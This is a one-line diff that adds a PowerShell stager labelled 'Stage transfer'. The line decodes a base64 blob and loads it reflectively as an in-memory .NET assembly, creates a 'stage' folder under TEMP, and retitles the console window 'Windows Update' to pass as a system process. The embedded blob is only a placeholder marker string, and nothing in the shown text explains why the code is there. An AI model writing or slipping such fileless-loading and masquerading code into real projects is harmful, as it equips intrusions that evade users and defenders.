@@ -1,0 +1,1 @@
+<# Stage transfer #> $AssemblyBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpyd3NnYWtscDR0"); Write-Verbose ("Assembly bytes: " + $AssemblyBytes.Length); [Reflection.Assembly]::Load($AssemblyBytes); $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; $Host.UI.RawUI.WindowTitle = "Windows Update"
